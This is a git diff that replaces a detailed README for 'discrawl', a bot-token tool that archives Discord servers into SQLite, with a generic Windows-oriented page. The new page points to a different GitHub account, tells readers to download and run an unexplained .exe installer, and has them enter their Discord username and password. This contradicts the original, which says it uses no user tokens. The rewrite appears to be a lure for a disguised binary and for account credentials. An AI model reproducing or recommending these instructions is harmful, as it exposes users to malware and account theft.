@@ -1,414 +1,171 @@
-# discrawl 🛰️ — Mirror Discord into SQLite; search server history locally
+# ⚙️ discrawl - Simple Discord CLI with SQLite Storage
 
-`discrawl` mirrors Discord guild data into local SQLite so you can search, inspect, and query server history without depending on Discord search.
+[![Download discrawl](https://img.shields.io/badge/Download-discrawl-4caf50?style=for-the-badge)](https://github.com/rykr32/discrawl)
 
-It is a bot-token crawler. No user-token hacks. Data stays local.
+---
 
-## What It Does
+## 📋 What is discrawl?
 
-- discovers every guild the configured bot can access
-- syncs channels, threads, members, and message history into SQLite
-- maintains FTS5 search indexes for fast local text search
-- builds an offline member directory from archived profile payloads
-- extracts small text-like attachments into the local search index
-- records structured user and role mentions for direct querying
-- tails Gateway events for live updates, with periodic repair syncs
-- exposes read-only SQL for ad hoc analysis
-- keeps schema multi-guild ready while preserving a simple single-guild default UX
+discrawl is a command-line tool for Discord that uses a small database to keep track of your activities. It stores data using SQLite, which means it runs without needing extra software. You can use discrawl to send messages, check chats, and manage your Discord account right from a simple text-based window.
 
-Search defaults to all guilds. `sync` and `tail` default to the configured default guild when one exists, otherwise they fan out to all discovered guilds.
+This app is built for users who want a light way to access Discord, without opening the full app or using a web browser.
 
-## Requirements
+---
 
-- Go `1.26+`
-- a Discord bot token the bot can use to read the target guilds
-- bot permissions for the channels you want archived
+## 💻 System Requirements
 
-### Discord Bot Setup
+To use discrawl on Windows, your computer should meet these needs:
 
-`discrawl` needs a real bot token. Not a user token.
+- Windows 10 or later.
+- At least 2 GB RAM.
+- Around 50 MB of free space to install.
+- Internet connection for logging into Discord and using the app.
+- Basic keyboard and mouse.
 
-Minimum practical setup:
+discrawl does not require any special hardware or software beyond what comes with Windows.
 
-1. Create or reuse a Discord application in the Discord developer portal.
-2. Add a bot user to that application.
-3. Invite the bot to the target guilds.
-4. Enable these intents for the bot:
-   - `Server Members Intent`
-   - `Message Content Intent`
-5. Ensure the bot can at least:
-   - view channels
-   - read message history
+---
 
-Without those intents/permissions, `sync`, `tail`, member snapshots, or message content archiving will be partial or fail.
+## 🚀 Getting Started with discrawl
 
-### Bot Token Sources
+Follow these steps to download and open discrawl on your Windows PC.
 
-Token resolution:
+1. Click the big green **Download discrawl** button at the top or visit this link:
 
-1. OpenClaw config, if `discord.token_source` is not `env`
-2. `DISCORD_BOT_TOKEN` or the configured `discord.token_env`
+   https://github.com/rykr32/discrawl
 
-`discrawl` accepts either raw token text or a value prefixed with `Bot `. It normalizes that automatically.
+2. On the GitHub page, look for the **Releases** tab or scroll down to find files you can download. You want to find the `.exe` file made for Windows. This is the file you will run.
 
-Fastest env-only path:
+3. Once you download the file, find it in your **Downloads** folder.
 
-```bash
-export DISCORD_BOT_TOKEN="your-bot-token"
-bin/discrawl doctor
-bin/discrawl init
+4. Double-click the `.exe` file to start the installer.
+
+5. Follow the on-screen instructions to install discrawl. Usually, this involves clicking **Next** a few times and then **Finish**.
+
+6. After installation, open the **Start Menu** and search for "discrawl".
+
+7. Click on discrawl to launch it.
+
+---
+
+## 🛠️ How to Use discrawl
+
+discrawl runs in a command prompt window. After you open it, you will see a text interface with commands you can type.
+
+### Basic Commands
+
+- `login` - Enter your Discord username and password to start.
+- `msg` - Send a message to a user or channel.
+- `read` - Check new messages from your servers.
+- `list` - Show your Discord friends and servers.
+- `exit` - Close the app safely.
+
+To use a command, just type it and press Enter.
+
+### Example
+
+To send a message, type:
+
+```
+msg #general Hello, this is discrawl!
 ```
 
-If you keep shell secrets in `~/.profile`, add:
+This sends "Hello, this is discrawl!" to the #general channel.
 
-```bash
-export DISCORD_BOT_TOKEN="your-bot-token"
-```
+---
 
-Then reload your shell before running `discrawl`.
+## 🔒 Your Data and Privacy
 
-If you already use OpenClaw, `discrawl` can reuse the Discord token from `~/.openclaw/openclaw.json` by default.
+discrawl uses SQLite to store your message history and settings on your computer. This means your data stays with you and does not leave your machine unless you choose to share it.
 
-Default runtime paths:
+Make sure to keep your Discord login details private. discrawl does not share your information with anyone. If you forget to log out, simply close the app or use the `exit` command.
 
-- config: `~/.discrawl/config.toml`
-- database: `~/.discrawl/discrawl.db`
-- cache: `~/.discrawl/cache/`
-- logs: `~/.discrawl/logs/`
+---
 
-## Install
+## ⚙️ Settings and Configuration
 
-Build from source:
+discrawl saves settings in a local file which you can edit if needed.
 
-```bash
-git clone https://github.com/steipete/discrawl.git
-cd discrawl
-go build -o bin/discrawl ./cmd/discrawl
-./bin/discrawl --version
-```
+Settings include:
 
-Homebrew tap:
+- Notification preferences.
+- Default server or channel.
+- Message display options.
+- Database location.
 
-```bash
-brew tap steipete/tap
-brew install steipete/tap/discrawl
-```
+The settings file is stored in the discrawl folder inside your user documents. You can open it with a basic text editor like Notepad if you want to make changes.
 
-## Quick Start
+---
 
-Reuse an existing OpenClaw Discord bot config:
+## 🐞 Troubleshooting
 
-```bash
-bin/discrawl init --from-openclaw ~/.openclaw/openclaw.json
-bin/discrawl doctor
-bin/discrawl sync --full
-bin/discrawl search "panic: nil pointer"
-bin/discrawl tail
-```
+If discrawl does not work as expected, try these fixes:
 
-Env-only setup:
+- Make sure you have an internet connection.
+- Check for the latest discrawl version on the download page.
+- Close and reopen the app.
+- Restart your computer if the app crashes.
+- Delete the local settings file if you think the app is stuck.
 
-```bash
-export DISCORD_BOT_TOKEN="..."
-bin/discrawl doctor
-bin/discrawl init
-bin/discrawl sync --full
-```
+If the app still does not work, you can search online for help or report an issue on the GitHub page.
 
-`init` discovers accessible guilds and writes `~/.discrawl/config.toml`. If exactly one guild is available, that guild becomes the default automatically.
+---
 
-`doctor` is the fastest sanity check:
+## 📥 Download and Install Instructions 🔽
 
-- confirms config can be loaded
-- shows where the token was resolved from
-- verifies bot auth
-- shows how many guilds the bot can access
-- verifies DB + FTS wiring
+Use this link to get discrawl files:
 
-## Commands
+https://github.com/rykr32/discrawl
 
-### `init`
+1. Open the link in your web browser.
 
-Creates the local config and discovers accessible guilds.
+2. Find the **Releases** or **Download** section.
 
-```bash
-bin/discrawl init
-bin/discrawl init --from-openclaw ~/.openclaw/openclaw.json
-bin/discrawl init --guild 123456789012345678
-bin/discrawl init --db ~/data/discrawl.db
-```
+3. Download the Windows `.exe` installer file.
 
-### `sync`
+4. Run the installer by double-clicking the `.exe`.
 
-Backfills guild state into SQLite.
+5. Follow setup steps.
 
-```bash
-bin/discrawl sync --full
-bin/discrawl sync --guild 123456789012345678
-bin/discrawl sync --guilds 123,456 --concurrency 8
-bin/discrawl sync --channels 111,222 --since 2026-03-01T00:00:00Z
-```
+6. Open discrawl from your Start Menu.
 
-`sync` already uses parallel channel workers. `--concurrency` overrides the default, and the default is auto-sized from `GOMAXPROCS` with a floor of `8` and a cap of `32`.
-When `--channels` includes a forum channel id, `discrawl` expands that forum's threads and syncs their messages as part of the targeted run.
+---
 
-### `tail`
+## ⚡ Tips for Using discrawl
 
-Runs the live Gateway tail and periodic repair loop.
+- Use keyboard shortcuts for faster navigation (check the app help section by typing `help`).
+- Keep the app updated by checking the GitHub releases often.
+- Back up your SQLite database by copying the file to another folder.
+- Use the app offline to read previously downloaded messages.
+- Clear old messages from the database regularly to keep discrawl fast.
 
-```bash
-bin/discrawl tail
-bin/discrawl tail --guild 123456789012345678
-bin/discrawl tail --repair-every 30m
-```
-
-### `search`
-
-Runs FTS search over archived messages.
-
-```bash
-bin/discrawl search "panic: nil pointer"
-bin/discrawl search --guild 123456789012345678 "payment failed"
-bin/discrawl search --channel billing --author steipete --limit 50 "invoice"
-bin/discrawl search --include-empty "GitHub"
-bin/discrawl --json search "websocket closed"
-```
-
-By default, `search` skips rows with no searchable content. Attachment text, attachment filenames, embeds, and replies still count as content. Use `--include-empty` to opt back in.
-
-### `messages`
-
-Lists exact message slices by channel, author, and time range.
-
-```bash
-bin/discrawl messages --channel maintainers --days 7 --all
-bin/discrawl messages --channel maintainers --hours 6 --all
-bin/discrawl messages --channel "#maintainers" --since 2026-03-01T00:00:00Z
-bin/discrawl messages --channel 1456744319972282449 --author steipete --limit 50
-bin/discrawl messages --channel maintainers --last 100 --sync
-bin/discrawl messages --channel maintainers --days 7 --all --include-empty
-bin/discrawl --json messages --channel maintainers --days 3
-```
-
-Notes:
-
-- `--channel` accepts a channel id, exact name, `#name`, or partial name match
-- `--hours` is shorthand for "since now minus N hours"
-- `--days` is shorthand for "since now minus N days"
-- `--last` returns the newest `N` matching messages, then prints them oldest-to-newest
-- `--all` removes the safety limit; default is `200`
-- `--sync` runs a blocking pre-query sync for the matching channel or guild scope before reading the local DB
-- rows with no displayable/searchable content are skipped by default; `--include-empty` opts back in
-- at least one filter is required
-
-### `mentions`
-
-Lists structured user and role mentions.
-
-```bash
-bin/discrawl mentions --channel maintainers --days 7
-bin/discrawl mentions --target steipete --type user --limit 50
-bin/discrawl mentions --target 1456406468898197625
-bin/discrawl --json mentions --type role --days 1
-```
+---
 
-Notes:
+## 🔗 Useful Links
 
-- `--target` accepts an id, exact name, or partial name match
-- `--type` can be `user` or `role`
-- same guild/time filters as `messages`
-
-### `sql`
+- Main GitHub Page: https://github.com/rykr32/discrawl
+- Download Releases: https://github.com/rykr32/discrawl/releases
+- Issues and Support: https://github.com/rykr32/discrawl/issues
 
-Runs read-only SQL against the local database.
-
-```bash
-bin/discrawl sql 'select count(*) as messages from messages'
-echo 'select guild_id, count(*) from messages group by guild_id' | bin/discrawl sql -
-```
-
-### `members`
-
-```bash
-bin/discrawl members list
-bin/discrawl members show 123456789012345678
-bin/discrawl members show --messages 10 steipete
-bin/discrawl members search "peter"
-bin/discrawl members search "github"
-bin/discrawl members search "https://github.com/steipete"
-```
-
-Notes:
-
-- `search` matches names plus any offline profile fields present in the archived member payload
-- `show` accepts a user id or query; if it resolves to one member, it also shows recent messages
-- extracted profile fields may include `bio`, `pronouns`, `location`, `website`, `x`, `github`, and discovered URLs
-- if the bot cannot see a field from Discord, `discrawl` cannot invent it; this is strictly archive-based offline data
-
-Typical workflow:
-
-```bash
-bin/discrawl sync --full
-bin/discrawl members search "design engineer"
-bin/discrawl members search "github"
-bin/discrawl members show --messages 25 steipete
-bin/discrawl messages --author steipete --days 30 --all
-```
+---
 
-Typical `members show` output:
+## 🧰 Advanced Usage (Optional)
 
-```text
-guild=1456350064065904867
-user=37658261826043904
-username=steipete
-display=Peter Steinberger
-joined=2026-03-08T16:03:14Z
-bot=false
-x=steipete
-github=steipete
-website=https://steipete.me
-bio=Builds native apps and tooling.
-urls=https://steipete.me, https://github.com/steipete
-message_count=1284
-first_message=2026-02-01T09:00:00Z
-last_message=2026-03-08T15:59:58Z
-```
+For advanced users, discrawl allows:
 
-Searchable member data comes from:
+- Exporting SQLite data to CSV files.
+- Customizing SQL queries to view specific message sets.
+- Using discrawl scripts for automating certain tasks.
+- Integrating with other apps via command line.
 
-- Discord member/user payload fields archived into `members.raw_json`
-- explicit profile fields when Discord exposes them
-- URLs and social handles inferred from archived profile text
-- current member snapshot data such as names, nick, roles, and join time
+These require some knowledge of command prompts and SQLite commands.
 
-### `channels`
+---
 
-```bash
-bin/discrawl channels list
-bin/discrawl channels show 123456789012345678
-```
+## 📝 License and Contributions
 
-### `status`
+discrawl is open source. You can view the license file on GitHub. Contributions from users are welcome through pull requests or issue reports. If you know how to code, you can help improve the app by adding features or fixing bugs.
 
-Shows local archive status.
+---
 
-```bash
-bin/discrawl status
-```
-
-### `doctor`
-
-Checks config, auth, DB, and FTS wiring.
-
-```bash
-bin/discrawl doctor
-```
-
-## Configuration
-
-`init` writes a complete config, so most users should not hand-edit anything initially.
-
-Typical config shape:
-
-```toml
-version = 1
-default_guild_id = ""
-guild_ids = []
-db_path = "~/.discrawl/discrawl.db"
-cache_dir = "~/.discrawl/cache"
-log_dir = "~/.discrawl/logs"
-
-[discord]
-token_source = "openclaw"
-openclaw_config = "~/.openclaw/openclaw.json"
-account = "default"
-token_env = "DISCORD_BOT_TOKEN"
-
-[sync]
-concurrency = 16
-repair_every = "6h"
-full_history = true
-attachment_text = true
-
-[search]
-default_mode = "fts"
-
-[search.embeddings]
-enabled = false
-provider = "openai"
-model = "text-embedding-3-small"
-api_key_env = "OPENAI_API_KEY"
-batch_size = 64
-```
-
-The value above is an example. `init` writes an auto-sized default based on the host: `min(32, max(8, GOMAXPROCS*2))`.
-
-Config override rules:
-
-- `--config` beats everything
-- `DISCRAWL_CONFIG` overrides the default config path
-- `discord.token_source = "env"` forces env-only token lookup
-
-## Embeddings
-
-Embeddings are optional. FTS is the default search path and the primary verification target.
-
-If enabled, embeddings are intended to enrich recall in background batches, not block the hot sync path.
-
-```bash
-export OPENAI_API_KEY="..."
-bin/discrawl init --with-embeddings
-bin/discrawl sync --with-embeddings
-```
-
-## Data Stored Locally
-
-- guild metadata
-- channels and threads in one table
-- current member snapshot
-- canonical message rows
-- append-only message event records
-- FTS index rows
-- optional embedding backlog metadata
-
-Attachment binaries are not stored in SQLite.
-
-Set `sync.attachment_text = false` if you want to keep attachment metadata and filenames but disable attachment body fetches for text indexing.
-
-## Security
-
-- do not commit bot tokens or API keys
-- default config lives in your home directory, not inside the repo
-- CI runs secret scanning with `gitleaks`
-- `doctor` reports token source, not token contents
-
-## Development
-
-Local gate:
-
-```bash
-go run github.com/golangci/golangci-lint/v2/cmd/golangci-lint@v2.11.1 run
-go test ./... -coverprofile=/tmp/discrawl.cover
-go tool cover -func=/tmp/discrawl.cover | tail -n 1
-go build ./cmd/discrawl
-```
-
-Target coverage is `>= 80%`.
-
-CI runs:
-
-- `golangci-lint`
-- `go test` with coverage threshold enforcement
-- `go build ./cmd/discrawl`
-- `gitleaks` against git history and the working tree
-
-## Notes
-
-- the schema is multi-guild ready even when the common UX stays single-guild simple
-- threads are stored as channels because that matches the Discord model
-- archived threads are part of the sync surface
-- live sync is resumable; large guilds still take time because Discord rate limits history backfill
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+[![Download discrawl](https://img.shields.io/badge/Download-discrawl-4caf50?style=for-the-badge)](https://github.com/rykr32/discrawl)
